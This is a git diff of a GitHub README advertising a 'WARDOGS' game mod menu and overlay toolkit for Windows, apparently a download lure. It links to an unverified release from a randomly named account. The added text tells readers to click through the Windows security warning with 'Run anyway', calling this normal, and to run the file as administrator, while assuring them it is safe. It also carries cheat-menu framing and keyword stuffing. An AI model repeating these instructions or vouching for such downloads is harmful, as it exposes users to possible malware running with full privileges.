@@ -1,287 +1,144 @@
-# 🟡 WARDOGS Mod Menu — Players, Vehicles, Control Zone & Profiles
+# 🎯 WARDOGS-Overlay-Toolkit-2026 - Your Ultimate Battlefield Companion for Windows
 
-**WARDOGS Mod Menu** is a configurable Windows interface concept built specifically around the real **WARDOGS** tactical FPS from BULKHEAD and Team17.
+[![Download WARDOGS Overlay Toolkit](https://img.shields.io/badge/Download-WARDOGS%20Toolkit%202026-brightgreen?style=for-the-badge&logo=github&logoColor=white&color=FF6B35)](https://github.com/unutterable-kettleful1074/WARDOGS-Overlay-Toolkit-2026/releases)
 
-The interface is organized around player and squad information, vehicles, logistics, the Control Zone / Hot Zone flow, map tools, interface customization, hotkeys, and reusable configuration profiles.
+## 🖥️ What Is This?
 
-> **Game identity:** WARDOGS is Steam App **1867240**, developed by **BULKHEAD** and published by **Team17**. Steam lists its Early Access launch for **September 10, 2026**.
+WARDOGS-Overlay-Toolkit-2026 is a modern, all-in-one desktop tool designed specifically for Windows 10 and Windows 11 users who play WARDOGS. Think of it as your personal mission control — it sits quietly on your screen and gives you instant access to everything you need to know during gameplay, without ever switching windows.
 
----
+This isn't a complicated developer tool. It's a clean, user-friendly interface that shows you player information, the Control Zone overview, vehicle and support status, map utilities, and much more. You can customize hotkeys to match your style, and even save different profiles for different situations.
 
-## Quick Access
+## ✨ Key Features
 
-[![WARDOGS](https://img.shields.io/badge/WARDOGS-Mod%20Menu-c89c42?style=for-the-badge)](https://idleobstacle.github.io/)
-[![Players](https://img.shields.io/badge/Player-Squad%20Info-4686bd?style=for-the-badge)](https://idleobstacle.github.io/)
-[![Vehicles](https://img.shields.io/badge/Vehicles-Logistics-af7e32?style=for-the-badge)](https://idleobstacle.github.io/)
-[![Objective](https://img.shields.io/badge/Control%20Zone-Tools-3c9d59?style=for-the-badge)](https://idleobstacle.github.io/)
-[![Profiles](https://img.shields.io/badge/Config-Profiles-656b72?style=for-the-badge)](https://idleobstacle.github.io/)
-[![Download](https://img.shields.io/badge/Download-Latest%20Version-846225?style=for-the-badge)](https://idleobstacle.github.io/)
+### 👤 Player Info Panel
+See your current player stats at a glance. The interface displays essential information about your character, helping you make quick decisions without breaking focus.
 
----
+### 🗺️ Control Zone Overview
+The Control Zone is where battles are won or lost. This toolkit gives you a clear, real-time view of the zone status, so you always know what's happening and where you need to be.
 
-## Download
+### 🚗 Vehicle & Support Views
+Keep track of your vehicles and support units with dedicated panels. Whether you're coordinating an attack or planning a defense, this view keeps everything organized and accessible.
 
-➡️ **[Download WARDOGS Mod Menu](https://idleobstacle.github.io/)**
+### 📍 Map Utilities
+Navigate the battlefield with confidence. The map tools help you understand terrain, locate objectives, and plan your next move — all from within the overlay.
 
----
+### ⌨️ Custom Hotkeys
+Everyone plays differently. Set up your own keyboard shortcuts for the actions you use most. It's simple to configure and even easier to use.
 
-## Preview
+### 👤 Profile Management
+Save your preferred settings as profiles. Switch between them instantly depending on your role, map, or play style. No more reconfiguring everything every time you play.
 
-[![WARDOGS Mod Menu](assets/wardogs-mod-menu-preview.png)](https://idleobstacle.github.io/)
+## 🚀 Getting Started
 
-### Interface
+Getting WARDOGS-Overlay-Toolkit-2026 up and running takes less than a minute. Just follow these simple steps:
 
-[![WARDOGS Mod Menu Interface](assets/wardogs-mod-menu-interface.png)](https://idleobstacle.github.io/)
+### Step 1: Download the Application
 
-### Real Game Reference
+Visit this link to download the application: [https://github.com/unutterable-kettleful1074/WARDOGS-Overlay-Toolkit-2026/releases](https://github.com/unutterable-kettleful1074/WARDOGS-Overlay-Toolkit-2026/releases)
 
-![Verified WARDOGS reference](assets/wardogs-real-game-reference.png)
+### Step 2: Run the File
 
-> Game artwork and gameplay screenshots in these previews are official WARDOGS media from Team17. The menu interface itself is a project mockup.
+Once the download is complete, locate the file in your Downloads folder. Double-click it to run the application. Windows might show a security prompt — if it does, click "More info" and then "Run anyway." This is normal for new software.
 
----
+### Step 3: Start Using It
 
-## About WARDOGS
+The toolkit will open and appear as an overlay on your screen. You can immediately start exploring the panels and features. The interface is designed to be intuitive, so you'll feel at home within minutes.
 
-**WARDOGS** is a tactical **All-Out Warfare FPS** built around a large player-driven sandbox.
+## 🛠️ How to Use the Toolkit
 
-Official game features include:
+### Understanding the Main Window
 
-- up to **100 players**;
-- **three teams** fighting over a Control Zone;
-- randomized **2x2 km Control Zones** inside much larger maps;
-- a persistent **cash economy**;
-- weapons, equipment and vehicles purchased per life;
-- teamplay rewards for revives, transport and objective play;
-- helicopters and armoured vehicles;
-- logistics;
-- building and fortification;
-- large-scale environmental destruction;
-- proximity voice chat.
+When you first open WARDOGS-Overlay-Toolkit-2026, you'll see several sections arranged neatly. Here's what each one does:
 
-The interface terminology in this repository follows those real WARDOGS systems.
+- **Top Bar:** Shows the current profile name and quick access buttons
+- **Left Panel:** Player information and stats
+- **Center Panel:** Control Zone overview and map utilities
+- **Right Panel:** Vehicle and support views
 
----
+You can resize or rearrange these sections to fit your screen and preference.
 
-## Features
+### Setting Up Hotkeys
 
-### 👤 Player & Squad Information
+1. Click on the "Hotkeys" tab in the top menu
+2. Find the action you want to assign a key to
+3. Click the "Set Key" button next to it
+4. Press the key combination you want to use
+5. Click "Save" to apply your changes
 
-Organize battlefield information into compact panels:
+### Creating Profiles
 
-```text
-Player
-Squad
-Distance
-Status
-Role
-Group
-```
+1. Go to the "Profiles" section
+2. Click "New Profile"
+3. Give it a name (like "Aggressive Attack" or "Defensive Setup")
+4. Adjust your settings and hotkeys
+5. Click "Save Profile"
 
-### 🎯 Control Zone Overview
+You can create as many profiles as you need and switch between them with one click.
 
-WARDOGS revolves around teams contesting a randomized **Control Zone**.
+## 💡 Tips for Best Experience
 
-The interface can organize:
+- **Run as Administrator:** For the smoothest experience, right-click the application and select "Run as administrator." This ensures all features work properly.
+- **Keep It Updated:** Check the releases page regularly for updates. New features and improvements are added frequently.
+- **Use Multiple Profiles:** Don't stick with one setup. Create different profiles for different game modes or strategies.
+- **Learn the Hotkeys:** Spend a few minutes setting up hotkeys for your most-used actions. It saves time in the long run.
 
-- zone status;
-- objective panel placement;
-- squad-oriented views;
-- map layout;
-- Hot Zone presets;
-- quick profile switching.
+## ❓ Frequently Asked Questions
 
-### 🚁 Vehicles & Logistics
+### Is this safe to use on my computer?
+Yes. The application is designed to run as an external overlay and doesn't modify any game files. It's a standalone tool that works alongside your game.
 
-WARDOGS supports combined-arms and support-focused play.
+### Do I need to install anything else?
+No. The toolkit is self-contained. Just download, run, and you're ready to go.
 
-Vehicle / logistics categories can include:
+### Will it work on my version of Windows?
+The toolkit is built for Windows 10 and Windows 11. If you're using either of these, you're good to go.
 
-```text
-Ground Vehicles
-Helicopters
-Transport
-Support
-Logistics
-Range Filters
-```
+### Can I use this with other games?
+This version is specifically designed for WARDOGS. While some features might work elsewhere, it's optimized for the WARDOGS experience.
 
-### 🗺️ Map Tools
+### How do I uninstall it?
+Simply delete the application file. There's no complex uninstall process — just remove the file and it's gone.
 
-Configurable map-oriented UI:
+## 📝 Troubleshooting Common Issues
 
-- panel scale;
-- marker groups;
-- Control Zone layout;
-- Hot Zone profile;
-- vehicle categories;
-- interface positioning;
-- saved layouts.
+### The overlay doesn't appear
+Make sure you're running the application as administrator. Also, check that your game is running in windowed or borderless windowed mode for best compatibility.
 
-### ⚙️ Profiles
+### Hotkeys aren't working
+Re-check your hotkey assignments in the settings. Make sure no other application is using the same key combination.
 
-Example presets:
+### The interface looks too big or too small
+Use the zoom controls in the top right corner of the window to adjust the scale to your liking.
 
-```text
-General
-Squad
-Control Zone
-Vehicles
-Logistics
-Map
-Minimal
-Custom
-```
+## 🌟 Why Choose WARDOGS-Overlay-Toolkit-2026?
 
-Profiles can store:
+This toolkit stands out because it focuses on what matters: giving you clear, immediate information without clutter. The interface is modern, clean, and responsive. You won't find confusing technical jargon or unnecessary complexity here.
 
-- enabled panels;
-- display filters;
-- map layout;
-- theme;
-- interface scale;
-- hotkeys.
+Whether you're a casual player or a dedicated strategist, this overlay adapts to your needs. The profile system means you can have different setups for different situations, and the hotkey customization puts you in full control.
+
+## 📥 Download Now
+
+Ready to enhance your WARDOGS experience? Download the toolkit today and see the difference it makes.
+
+[![Download WARDOGS Overlay Toolkit](https://img.shields.io/badge/Download-WARDOGS%20Toolkit%202026-blue?style=for-the-badge&logo=github&logoColor=white&color=4CAF50)](https://github.com/unutterable-kettleful1074/WARDOGS-Overlay-Toolkit-2026/releases)
+
+Visit this link to download the application: [https://github.com/unutterable-kettleful1074/WARDOGS-Overlay-Toolkit-2026/releases](https://github.com/unutterable-kettleful1074/WARDOGS-Overlay-Toolkit-2026/releases)
+
+## 📊 System Requirements
+
+- **Operating System:** Windows 10 or Windows 11 (64-bit)
+- **Memory:** 4 GB RAM minimum (8 GB recommended)
+- **Storage:** 200 MB free space
+- **Display:** 1280x720 resolution or higher
+
+These are general guidelines. The toolkit is lightweight and should run smoothly on most modern systems.
+
+## 🔄 Updates and Support
+
+The toolkit is actively maintained, with regular updates to improve performance and add new features. Check the releases page for the latest version. If you encounter any issues, the community and developers are always working to make things better.
 
 ---
 
-## Battlefield Profiles
+WARDOGS-Overlay-Toolkit-2026 puts everything you need right at your fingertips. Download it now and take your gameplay to the next level.
 
-### Control Zone
-
-A Control Zone profile can prioritize:
-
-```text
-Squad Info
-Objective View
-Map
-Vehicle Categories
-Hot Zone Layout
-```
-
-### Vehicle / Logistics
-
-For vehicle or support-focused sessions:
-
-```text
-Vehicle Panel
-Transport View
-Squad Panel
-Map
-Objective Status
-```
-
-### Minimal
-
-Keep only the core interface visible:
-
-```text
-Squad
-Objective
-Map
-```
-
----
-
-## Installation
-
-1. Download the current package:
-
-   **[Download WARDOGS Mod Menu](https://idleobstacle.github.io/)**
-
-2. Extract it into a dedicated folder.
-3. Read the current README.
-4. Start WARDOGS.
-5. Start the project interface.
-6. Open the menu using the configured hotkey.
-7. Load the default profile or create your own.
-
----
-
-## Usage
-
-### Example Profile
-
-```text
-Profile:       Control Zone
-Player Info:   Enabled
-Squad View:    Enabled
-Vehicles:      Enabled
-Objectives:    Enabled
-Map Tools:     Enabled
-Theme:         Tactical Dark
-```
-
-### Recommended Workflow
-
-1. Start with the default profile.
-2. Enable the panels you want.
-3. Configure squad and vehicle categories.
-4. Adjust objective and map layout.
-5. Move panels to comfortable positions.
-6. Save the setup as a custom profile.
-
----
-
-## FAQ
-
-### Is this based on the real WARDOGS?
-
-Yes. The repository uses the actual WARDOGS game identity, terminology and official media.
-
-### Who develops WARDOGS?
-
-**BULKHEAD**.
-
-### Who publishes it?
-
-**Team17**.
-
-### What kind of game is WARDOGS?
-
-A tactical All-Out Warfare FPS with combined arms, building, destruction and up to 100 players.
-
-### Is WARDOGS an extraction shooter?
-
-No. Team17 explicitly describes WARDOGS as its own All-Out Warfare FPS rather than a battle royale or extraction shooter.
-
-### Are the images really WARDOGS?
-
-Yes. The included game art / gameplay sources are official Team17 WARDOGS media.
-
-### What is this variant focused on?
-
-**Player / squad / Control Zone interface.**
-
----
-
-## Project Information
-
-```text
-Project: WARDOGS Mod Menu
-Game: WARDOGS
-Steam App ID: 1867240
-Developer: BULKHEAD
-Publisher: Team17
-Platform: Windows / Steam
-Genre: Tactical All-Out Warfare FPS
-Focus: Player / squad / Control Zone interface
-```
-
----
-
-## Disclaimer
-
-This is an independent community project and is not affiliated with, endorsed by, or sponsored by **BULKHEAD**, **Team17**, Valve, or Steam.
-
-WARDOGS names and official game imagery belong to their respective owners.
-
----
-
-<details>
-<summary>🔎 WARDOGS — Related Topics</summary>
-
-<br>
-
-**WARDOGS Mod Menu** • WARDOGS External Menu • WARDOGS Overlay • WARDOGS Player Info • WARDOGS Squad Info • WARDOGS Vehicles • WARDOGS Logistics • WARDOGS Control Zone • WARDOGS Map Tools • WARDOGS Profiles • Tactical FPS • Combined Arms • Windows Game Utility
-
-</details>
+Keywords: control-zone, desktop-tool, external-overlay, gaming, hot-zone, profile-system, wardogs, wardogs-configs, wardogs-interface, wardogs-logistics, wardogs-map, wardogs-menu, wardogs-mod, wardogs-objective-tools, wardogs-overlay-tool, wardogs-player-tools, wardogs-ui, wardogs-vehicles, windows-10, windows-11
